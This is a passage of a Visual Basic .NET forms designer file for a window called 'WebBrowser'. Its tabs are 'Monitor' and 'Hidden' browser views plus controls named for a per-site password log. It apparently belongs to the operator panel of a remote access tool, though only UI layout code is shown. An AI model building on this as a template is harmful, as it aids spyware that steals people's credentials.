<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class WebBrowser
    Inherits basestyle

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.Panel3 = New System.Windows.Forms.Panel()
        Me.selcthtmlbtn = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.combotyps = New DrakeUI.Framework.DrakeUIComboBox()
        Me.Panel4 = New System.Windows.Forms.Panel()
        Me.monitorinput = New DrakeUI.Framework.DrakeUITextBox()
        Me.strtmonitor = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.maintabs = New DrakeUI.Framework.DrakeUITabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.viewmonitor = New System.Windows.Forms.PictureBox()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.inputtext = New DrakeUI.Framework.DrakeUITextBox()
        Me.viewhidden = New System.Windows.Forms.PictureBox()
        Me.Panel9 = New System.Windows.Forms.Panel()
        Me.urlinputhiden = New DrakeUI.Framework.DrakeUITextBox()
        Me.DrakeUIButtonIcon5 = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.DrakeWidth_W4 = New DrakeUI.Framework.DrakeWidth_W()
        Me.DrakeUIButtonIcon4 = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.DrakeWidth_W3 = New DrakeUI.Framework.DrakeWidth_W()
        Me.DrakeUIButtonIcon3 = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.stophdbbtn = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.passtextlog = New System.Windows.Forms.RichTextBox()
        Me.Panel7 = New System.Windows.Forms.Panel()
        Me.combositespass = New DrakeUI.Framework.DrakeUIComboBox()
        Me.Panel6 = New System.Windows.Forms.Panel()
        Me.DrakeUIButtonIcon1 = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.dellall = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.DrakeWidth_W11 = New DrakeUI.Framework.DrakeWidth_W()
        Me.refpasses = New DrakeUI.Framework.DrakeUIButtonIcon()
        Me.statetimer = New System.Windows.Forms.Timer(Me.components)
        Me.Panel5 = New System.Windows.Forms.Panel()
        CType(Me.myscr, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.myico, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.Panel3.SuspendLayout()
        Me.Panel4.SuspendLayout()
        Me.maintabs.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        CType(Me.viewmonitor, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage2.SuspendLayout()
        CType(Me.viewhidden, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.Panel9.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.Panel7.SuspendLayout()
        Me.Panel6.SuspendLayout()
        Me.Panel5.SuspendLayout()
        Me.SuspendLayout()
        '
        'Panel3
        '
        Me.Panel3.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Panel3.Controls.Add(Me.selcthtmlbtn)
        Me.Panel3.Controls.Add(Me.combotyps)
        Me.Panel3.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel3.Location = New System.Drawing.Point(0, 0)
        Me.Panel3.Name = "Panel3"
        Me.Panel3.Padding = New System.Windows.Forms.Padding(10)
        Me.Panel3.Size = New System.Drawing.Size(738, 45)
        Me.Panel3.TabIndex = 40
        '
        'selcthtmlbtn
        '
        Me.selcthtmlbtn.Cursor = System.Windows.Forms.Cursors.Hand
        Me.selcthtmlbtn.Dock = System.Windows.Forms.DockStyle.Right
        Me.selcthtmlbtn.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.selcthtmlbtn.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.selcthtmlbtn.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.selcthtmlbtn.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.selcthtmlbtn.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.selcthtmlbtn.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.selcthtmlbtn.ForeHoverColor = System.Drawing.Color.Gray
        Me.selcthtmlbtn.Location = New System.Drawing.Point(589, 10)
        Me.selcthtmlbtn.Name = "selcthtmlbtn"
        Me.selcthtmlbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.selcthtmlbtn.RectColor = System.Drawing.Color.Gray
        Me.selcthtmlbtn.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.selcthtmlbtn.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.selcthtmlbtn.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.selcthtmlbtn.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.selcthtmlbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.selcthtmlbtn.Size = New System.Drawing.Size(139, 25)
        Me.selcthtmlbtn.Style = DrakeUI.Framework.UIStyle.Custom
        Me.selcthtmlbtn.Symbol = 61787
        Me.selcthtmlbtn.TabIndex = 45
        Me.selcthtmlbtn.Text = "Html file"
        Me.selcthtmlbtn.Visible = False
        '
        'combotyps
        '
        Me.combotyps.Dock = System.Windows.Forms.DockStyle.Left
        Me.combotyps.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList
        Me.combotyps.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.combotyps.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.combotyps.ForeColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.combotyps.Items.AddRange(New Object() {"From URL", "From File"})
        Me.combotyps.Location = New System.Drawing.Point(10, 10)
        Me.combotyps.Margin = New System.Windows.Forms.Padding(4, 5, 4, 5)
        Me.combotyps.MinimumSize = New System.Drawing.Size(63, 0)
        Me.combotyps.Name = "combotyps"
        Me.combotyps.Padding = New System.Windows.Forms.Padding(0, 0, 30, 0)
        Me.combotyps.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.combotyps.RectColor = System.Drawing.Color.Gray
        Me.combotyps.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.combotyps.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.combotyps.Size = New System.Drawing.Size(167, 25)
        Me.combotyps.Style = DrakeUI.Framework.UIStyle.Custom
        Me.combotyps.TabIndex = 44
        Me.combotyps.Text = "From URL"
        Me.combotyps.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft
        '
        'Panel4
        '
        Me.Panel4.Controls.Add(Me.monitorinput)
        Me.Panel4.Controls.Add(Me.strtmonitor)
        Me.Panel4.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel4.Location = New System.Drawing.Point(0, 45)
        Me.Panel4.Name = "Panel4"
        Me.Panel4.Padding = New System.Windows.Forms.Padding(5)
        Me.Panel4.Size = New System.Drawing.Size(738, 36)
        Me.Panel4.TabIndex = 46
        '
        'monitorinput
        '
        Me.monitorinput.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.monitorinput.Cursor = System.Windows.Forms.Cursors.IBeam
        Me.monitorinput.Dock = System.Windows.Forms.DockStyle.Fill
        Me.monitorinput.FillColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.monitorinput.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.monitorinput.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.monitorinput.ForeColor = System.Drawing.Color.White
        Me.monitorinput.Location = New System.Drawing.Point(177, 5)
        Me.monitorinput.Margin = New System.Windows.Forms.Padding(4, 5, 4, 5)
        Me.monitorinput.Maximum = 2147483647.0R
        Me.monitorinput.Minimum = -2147483648.0R
        Me.monitorinput.Name = "monitorinput"
        Me.monitorinput.Padding = New System.Windows.Forms.Padding(5)
        Me.monitorinput.Radius = 15
        Me.monitorinput.RectColor = System.Drawing.Color.Gray
        Me.monitorinput.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.monitorinput.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None
        Me.monitorinput.Size = New System.Drawing.Size(556, 25)
        Me.monitorinput.Style = DrakeUI.Framework.UIStyle.Custom
        Me.monitorinput.TabIndex = 31
        Me.monitorinput.TextAlignment = System.Drawing.ContentAlignment.TopCenter
        Me.monitorinput.Watermark = "Website link"
        '
        'strtmonitor
        '
        Me.strtmonitor.Cursor = System.Windows.Forms.Cursors.Hand
        Me.strtmonitor.Dock = System.Windows.Forms.DockStyle.Left
        Me.strtmonitor.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.strtmonitor.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.strtmonitor.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.strtmonitor.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.strtmonitor.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.strtmonitor.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.strtmonitor.ForeHoverColor = System.Drawing.Color.Gray
        Me.strtmonitor.Location = New System.Drawing.Point(5, 5)
        Me.strtmonitor.Name = "strtmonitor"
        Me.strtmonitor.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.strtmonitor.RectColor = System.Drawing.Color.Gray
        Me.strtmonitor.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.strtmonitor.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.strtmonitor.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.strtmonitor.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.strtmonitor.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.strtmonitor.Size = New System.Drawing.Size(172, 26)
        Me.strtmonitor.Style = DrakeUI.Framework.UIStyle.Custom
        Me.strtmonitor.TabIndex = 46
        Me.strtmonitor.Text = "Show"
        '
        'maintabs
        '
        Me.maintabs.Controls.Add(Me.TabPage1)
        Me.maintabs.Controls.Add(Me.TabPage2)
        Me.maintabs.Controls.Add(Me.TabPage3)
        Me.maintabs.Dock = System.Windows.Forms.DockStyle.Fill
        Me.maintabs.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed
        Me.maintabs.FillColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.maintabs.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.maintabs.ItemSize = New System.Drawing.Size(150, 40)
        Me.maintabs.Location = New System.Drawing.Point(10, 10)
        Me.maintabs.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom
        Me.maintabs.Name = "maintabs"
        Me.maintabs.SelectedIndex = 0
        Me.maintabs.Size = New System.Drawing.Size(738, 855)
        Me.maintabs.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.maintabs.Style = DrakeUI.Framework.UIStyle.Custom
        Me.maintabs.StyleCustomMode = True
        Me.maintabs.TabBackColor = System.Drawing.Color.FromArgb(CType(CType(35, Byte), Integer), CType(CType(35, Byte), Integer), CType(CType(35, Byte), Integer))
        Me.maintabs.TabIndex = 46
        Me.maintabs.TabSelectedColor = System.Drawing.Color.FromArgb(CType(CType(35, Byte), Integer), CType(CType(35, Byte), Integer), CType(CType(35, Byte), Integer))
        Me.maintabs.TabSelectedForeColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(136, Byte), Integer), CType(CType(229, Byte), Integer))
        Me.maintabs.TabSelectedHighColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(136, Byte), Integer), CType(CType(229, Byte), Integer))
        Me.maintabs.TabUnSelectedForeColor = System.Drawing.Color.DarkGray
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.TabPage1.Controls.Add(Me.viewmonitor)
        Me.TabPage1.Controls.Add(Me.Panel4)
        Me.TabPage1.Controls.Add(Me.Panel3)
        Me.TabPage1.Location = New System.Drawing.Point(0, 40)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Size = New System.Drawing.Size(738, 815)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Monitor"
        '
        'viewmonitor
        '
        Me.viewmonitor.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.viewmonitor.Dock = System.Windows.Forms.DockStyle.Fill
        Me.viewmonitor.Location = New System.Drawing.Point(0, 81)
        Me.viewmonitor.Name = "viewmonitor"
        Me.viewmonitor.Size = New System.Drawing.Size(738, 734)
        Me.viewmonitor.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.viewmonitor.TabIndex = 41
        Me.viewmonitor.TabStop = False
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.inputtext)
        Me.TabPage2.Controls.Add(Me.viewhidden)
        Me.TabPage2.Controls.Add(Me.Panel9)
        Me.TabPage2.Location = New System.Drawing.Point(0, 40)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Size = New System.Drawing.Size(738, 815)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Hidden"
        '
        'inputtext
        '
        Me.inputtext.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.inputtext.Cursor = System.Windows.Forms.Cursors.IBeam
        Me.inputtext.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.inputtext.FillColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.inputtext.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.inputtext.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.inputtext.ForeColor = System.Drawing.Color.White
        Me.inputtext.Location = New System.Drawing.Point(0, 790)
        Me.inputtext.Margin = New System.Windows.Forms.Padding(4, 5, 4, 5)
        Me.inputtext.Maximum = 2147483647.0R
        Me.inputtext.Minimum = -2147483648.0R
        Me.inputtext.Name = "inputtext"
        Me.inputtext.Padding = New System.Windows.Forms.Padding(5)
        Me.inputtext.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.inputtext.RectColor = System.Drawing.Color.Gray
        Me.inputtext.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.inputtext.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.inputtext.Size = New System.Drawing.Size(738, 25)
        Me.inputtext.Style = DrakeUI.Framework.UIStyle.Custom
        Me.inputtext.TabIndex = 67
        Me.inputtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter
        Me.inputtext.Watermark = "Send text"
        '
        'viewhidden
        '
        Me.viewhidden.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.viewhidden.Dock = System.Windows.Forms.DockStyle.Fill
        Me.viewhidden.Location = New System.Drawing.Point(0, 43)
        Me.viewhidden.Name = "viewhidden"
        Me.viewhidden.Size = New System.Drawing.Size(738, 772)
        Me.viewhidden.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.viewhidden.TabIndex = 48
        Me.viewhidden.TabStop = False
        '
        'Panel9
        '
        Me.Panel9.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Panel9.Controls.Add(Me.urlinputhiden)
        Me.Panel9.Controls.Add(Me.DrakeUIButtonIcon5)
        Me.Panel9.Controls.Add(Me.DrakeWidth_W4)
        Me.Panel9.Controls.Add(Me.DrakeUIButtonIcon4)
        Me.Panel9.Controls.Add(Me.DrakeWidth_W3)
        Me.Panel9.Controls.Add(Me.DrakeUIButtonIcon3)
        Me.Panel9.Controls.Add(Me.stophdbbtn)
        Me.Panel9.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel9.Location = New System.Drawing.Point(0, 0)
        Me.Panel9.Name = "Panel9"
        Me.Panel9.Padding = New System.Windows.Forms.Padding(10)
        Me.Panel9.Size = New System.Drawing.Size(738, 43)
        Me.Panel9.TabIndex = 47
        '
        'urlinputhiden
        '
        Me.urlinputhiden.Cursor = System.Windows.Forms.Cursors.IBeam
        Me.urlinputhiden.Dock = System.Windows.Forms.DockStyle.Fill
        Me.urlinputhiden.FillColor = System.Drawing.Color.FromArgb(CType(CType(35, Byte), Integer), CType(CType(35, Byte), Integer), CType(CType(35, Byte), Integer))
        Me.urlinputhiden.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.urlinputhiden.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.urlinputhiden.ForeColor = System.Drawing.Color.White
        Me.urlinputhiden.Location = New System.Drawing.Point(222, 10)
        Me.urlinputhiden.Margin = New System.Windows.Forms.Padding(4, 5, 4, 5)
        Me.urlinputhiden.Maximum = 2147483647.0R
        Me.urlinputhiden.Minimum = -2147483648.0R
        Me.urlinputhiden.Name = "urlinputhiden"
        Me.urlinputhiden.Padding = New System.Windows.Forms.Padding(5)
        Me.urlinputhiden.Radius = 15
        Me.urlinputhiden.RectColor = System.Drawing.Color.Gray
        Me.urlinputhiden.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.urlinputhiden.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None
        Me.urlinputhiden.Size = New System.Drawing.Size(470, 25)
        Me.urlinputhiden.Style = DrakeUI.Framework.UIStyle.Custom
        Me.urlinputhiden.TabIndex = 31
        Me.urlinputhiden.TextAlignment = System.Drawing.ContentAlignment.TopCenter
        Me.urlinputhiden.Watermark = "Website link"
        '
        'DrakeUIButtonIcon5
        '
        Me.DrakeUIButtonIcon5.Cursor = System.Windows.Forms.Cursors.Hand
        Me.DrakeUIButtonIcon5.Dock = System.Windows.Forms.DockStyle.Left
        Me.DrakeUIButtonIcon5.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon5.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon5.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon5.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon5.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon5.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.DrakeUIButtonIcon5.ForeHoverColor = System.Drawing.Color.Gray
        Me.DrakeUIButtonIcon5.Location = New System.Drawing.Point(158, 10)
        Me.DrakeUIButtonIcon5.Name = "DrakeUIButtonIcon5"
        Me.DrakeUIButtonIcon5.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.DrakeUIButtonIcon5.RectColor = System.Drawing.Color.Gray
        Me.DrakeUIButtonIcon5.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.DrakeUIButtonIcon5.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon5.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon5.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon5.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.DrakeUIButtonIcon5.Size = New System.Drawing.Size(64, 23)
        Me.DrakeUIButtonIcon5.Style = DrakeUI.Framework.UIStyle.Custom
        Me.DrakeUIButtonIcon5.Symbol = 61470
        Me.DrakeUIButtonIcon5.TabIndex = 53
        '
        'DrakeWidth_W4
        '
        Me.DrakeWidth_W4.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Left
        Me.DrakeWidth_W4.Location = New System.Drawing.Point(148, 10)
        Me.DrakeWidth_W4.Name = "DrakeWidth_W4"
        Me.DrakeWidth_W4.Size = New System.Drawing.Size(10, 23)
        Me.DrakeWidth_W4.TabIndex = 52
        '
        'DrakeUIButtonIcon4
        '
        Me.DrakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand
        Me.DrakeUIButtonIcon4.Dock = System.Windows.Forms.DockStyle.Left
        Me.DrakeUIButtonIcon4.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon4.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon4.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon4.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon4.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon4.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.DrakeUIButtonIcon4.ForeHoverColor = System.Drawing.Color.Gray
        Me.DrakeUIButtonIcon4.Location = New System.Drawing.Point(84, 10)
        Me.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4"
        Me.DrakeUIButtonIcon4.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.DrakeUIButtonIcon4.RectColor = System.Drawing.Color.Gray
        Me.DrakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.DrakeUIButtonIcon4.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon4.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon4.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon4.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.DrakeUIButtonIcon4.Size = New System.Drawing.Size(64, 23)
        Me.DrakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom
        Me.DrakeUIButtonIcon4.Symbol = 61540
        Me.DrakeUIButtonIcon4.TabIndex = 51
        '
        'DrakeWidth_W3
        '
        Me.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Left
        Me.DrakeWidth_W3.Location = New System.Drawing.Point(74, 10)
        Me.DrakeWidth_W3.Name = "DrakeWidth_W3"
        Me.DrakeWidth_W3.Size = New System.Drawing.Size(10, 23)
        Me.DrakeWidth_W3.TabIndex = 50
        '
        'DrakeUIButtonIcon3
        '
        Me.DrakeUIButtonIcon3.Cursor = System.Windows.Forms.Cursors.Hand
        Me.DrakeUIButtonIcon3.Dock = System.Windows.Forms.DockStyle.Left
        Me.DrakeUIButtonIcon3.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon3.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon3.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon3.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon3.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon3.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.DrakeUIButtonIcon3.ForeHoverColor = System.Drawing.Color.Gray
        Me.DrakeUIButtonIcon3.Location = New System.Drawing.Point(10, 10)
        Me.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3"
        Me.DrakeUIButtonIcon3.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.DrakeUIButtonIcon3.RectColor = System.Drawing.Color.Gray
        Me.DrakeUIButtonIcon3.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
